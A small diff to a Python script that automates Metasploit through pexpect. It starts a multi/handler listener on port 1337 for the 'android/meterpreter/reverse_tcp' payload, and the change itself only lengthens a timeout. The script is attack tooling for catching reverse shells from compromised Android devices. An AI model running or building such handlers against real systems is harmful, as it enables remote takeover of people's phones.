@@ -5,7 +5,7 @@ LPORT = "1337"
 PAYLOAD = "android/meterpreter/reverse_tcp"
 
 def launch_handler():
-    child = pexpect.spawn("msfconsole", encoding='utf-8', timeout=30)
+    child = pexpect.spawn("msfconsole", encoding='utf-8', timeout=120)
     child.expect("msf6 >")
     child.sendline("use exploit/multi/handler")
     child.expect("msf6 exploit")
